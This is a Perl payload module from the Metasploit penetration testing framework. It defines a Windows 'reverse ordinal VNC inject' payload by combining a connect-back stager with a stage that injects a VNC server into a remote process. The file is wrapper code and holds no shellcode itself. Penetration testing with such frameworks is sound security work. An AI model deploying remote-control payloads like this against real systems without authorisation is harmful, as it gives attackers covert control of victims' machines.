
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::win32_reverse_ord_vncinject;
use strict;
use base 'Msf::PayloadComponent::Windows::ia32::InjectVncStage';
use FindBin qw{$RealBin};

my $info =
{
	'Name'         => 'Windows Reverse Ordinal VNC Server Inject',
	'Version'      => '$Revision$',
	'Description'  => 'Connect back and inject a VNC server into the remote process',
};

# libinject ships over it's own resolver, and doesn't depend on the ebp
# structures like the shell stages do.  This means that all it expects is
# socket in edi, and that is the same as the ordinal stager spec.  So, no 
# adapter needed or anything, just stage and go!
sub _Load 
{
	Msf::PayloadComponent::Windows::ia32::InjectVncStage->_Import('Msf::PayloadComponent::Windows::ia32::ReverseOrdinalStager');

	__PACKAGE__->SUPER::_Load();
}

sub new 
{
	my $class = shift;
	my $hash = @_ ? shift : { };
	my $self;

	_Load();

	$hash = $class->MergeHashRec($hash, {'Info' => $info});
	$self = $class->SUPER::new($hash, @_);

	return($self);
}

1;
